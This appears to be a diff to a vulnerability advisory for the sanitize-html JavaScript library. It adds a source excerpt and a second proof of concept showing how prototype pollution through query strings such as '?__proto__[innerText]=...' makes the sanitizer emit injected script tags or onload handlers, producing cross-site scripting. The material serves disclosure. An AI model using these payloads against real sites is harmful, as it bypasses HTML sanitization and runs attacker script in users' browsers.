@@ -18,7 +18,17 @@ https://github.com/apostrophecms/sanitize-html/blob/d78ee44069b3a3bb70aca3289de6
             passedAllowedAttributesMapCheck = true;
 ```
 
+https://github.com/apostrophecms/sanitize-html/blob/4c229fbbc9c269236b571dcbf834dc7c0ea19012/index.js#L194-L196
+```js
+        result += ">";
+        if (frame.innerText && !hasText && !options.textFilter) {
+          result += frame.innerText;
+        }
+```
+
 ### PoC
+
+#### PoC #1
 
 ```
 ?__proto__[*][]=onload
@@ -31,5 +41,21 @@ https://github.com/apostrophecms/sanitize-html/blob/d78ee44069b3a3bb70aca3289de6
 </script>
 <script>
   document.write(sanitizeHtml('<iframe onload=alert(1)>'))
+</script>
+```
+
+#### PoC #2
+
+```
+?__proto__[innerText]=<script>alert(1)</script>
+```
+
+```html
+<script src="https://cdnjs.cloudflare.com/ajax/libs/sanitize-html/1.27.5/sanitize-html.min.js"></script>
+<script>
+  Object.prototype.innerText = "<script>alert(1)<\/script>"
+</script>
+<script>
+  document.write(sanitizeHtml('<a>'))
 </script>
 ```
